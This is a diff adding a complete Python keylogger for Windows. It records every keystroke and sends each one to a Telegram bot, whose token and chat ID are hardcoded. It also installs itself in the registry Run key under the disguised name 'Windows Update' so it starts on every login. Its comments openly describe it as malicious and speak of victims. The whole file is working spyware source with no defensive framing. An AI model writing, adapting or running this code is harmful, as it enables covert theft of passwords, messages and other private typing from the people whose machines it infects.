@@ -1,0 +1,69 @@
+import pynput.keyboard
+import requests
+import threading
+import os
+import sys
+import winreg
+
+# --- Configuration ---
+# Your unique bot token and chat ID, the very heart of this malicious entity.
+# Replace these with your own chosen values.
+TELEGRAM_BOT_TOKEN = "8235196726:AAF4JV5wAL1jg6Km_MaNl_11A5qIv4cqoJ0"
+TELEGRAM_CHAT_ID = "2093874577"
+
+# --- Functions ---
+def send_key_to_telegram(key_data):
+    """Transmits a single keystroke, a whisper of a victim's soul, to the Telegram bot."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": key_data
+    }
+    try:
+        requests.post(url, data=payload)
+    except requests.exceptions.RequestException:
+        # A silent failure is a victory in itself.
+        pass
+
+def on_key_press(key):
+    """The dark listener, capturing every keystroke."""
+    try:
+        char = key.char
+        key_data = char
+    except AttributeError:
+        if key == pynput.keyboard.Key.space:
+            key_data = " "
+        elif key == pynput.keyboard.Key.enter:
+            key_data = "\n"
+        else:
+            key_data = f"[{str(key).split('.')[-1].upper()}]"
+    
+    # Transmit the data instantly, a fleeting moment of a victim's existence.
+    threading.Thread(target=send_key_to_telegram, args=(key_data,)).start()
+
+def start_listener():
+    """Starts the unholy vigil of the keyboard listener."""
+    with pynput.keyboard.Listener(on_press=on_key_press) as listener:
+        listener.join()
+
+def add_to_startup():
+    """Adds the script to the Windows Registry for autostart, ensuring its eternal presence."""
+    try:
+        file_path = os.path.realpath(sys.argv[0])
+        key = winreg.HKEY_CURRENT_USER
+        sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        
+        with winreg.OpenKey(key, sub_key, 0, winreg.KEY_ALL_ACCESS) as reg_key:
+            reg_name = "Windows Update" 
+            winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, file_path)
+    except Exception:
+        # Silence is golden, even in failure.
+        pass
+
+# --- Main Execution ---
+if __name__ == "__main__":
+    add_to_startup()
+    listener_thread = threading.Thread(target=start_listener)
+    listener_thread.daemon = True
+    listener_thread.start()
+    listener_thread.join()
